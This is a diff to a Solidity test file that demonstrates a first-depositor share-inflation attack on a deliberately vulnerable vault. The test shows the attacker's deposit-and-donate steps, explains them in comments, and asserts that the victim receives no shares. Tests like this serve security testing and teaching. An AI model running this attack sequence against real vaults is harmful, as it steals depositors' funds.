@@ -22,16 +22,32 @@ contract VulnerableVaultTest is Test {
         asset.approve(address(vault), type(uint256).max);
     }
 
-    function test_firstDepositorInflationAttack_drainsVictim() public {
+    function test_firstDepositorInflationAttack_stealsVictimShareAllocation() public {
+        // Attacker becomes the first depositor.
         vm.prank(attacker);
         vault.deposit(1, attacker);
 
+        // Attacker artificially increases the vault's asset balance
+        // without receiving any additional shares.
         vm.prank(attacker);
         asset.transfer(address(vault), 5 ether);
 
+        // Victim deposits 5 ether.
         vm.prank(victim);
         vault.deposit(5 ether, victim);
 
-        assertGt(vault.balanceOf(attacker), vault.balanceOf(victim));
-    }
+        // Victim receives zero shares because the vulnerable vault
+        // calculates shares using the post-deposit asset balance.
+        assertEq(vault.balanceOf(victim), 0);
+
+        // Attacker still owns the only share.
+        assertEq(vault.balanceOf(attacker), 1);
+
+        // The vault now holds the attacker's donation + victim's deposit.
+        assertEq(asset.balanceOf(address(vault)), 10 ether + 1);
+
+        // All outstanding shares still belong to the attacker.
+        assertEq(vault.totalSupply(), 1);
+        assertEq(vault.balanceOf(attacker), vault.totalSupply());
+}
 }
